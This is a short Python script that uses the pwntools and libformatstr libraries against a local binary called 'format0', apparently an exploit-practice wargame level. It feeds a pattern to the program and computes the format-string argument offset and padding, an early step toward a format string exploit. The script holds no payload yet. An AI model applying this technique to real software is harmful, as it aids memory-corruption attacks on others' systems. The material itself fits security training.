#import sys
from pwn import *
from libformatstr import *

bufsiz = 100

p = process(['./format0',make_pattern(bufsiz)]) 

output = p.recv().split()
print output

data = output[6]                     
offset, padding = guess_argnum(data, bufsiz)

print offset, padding


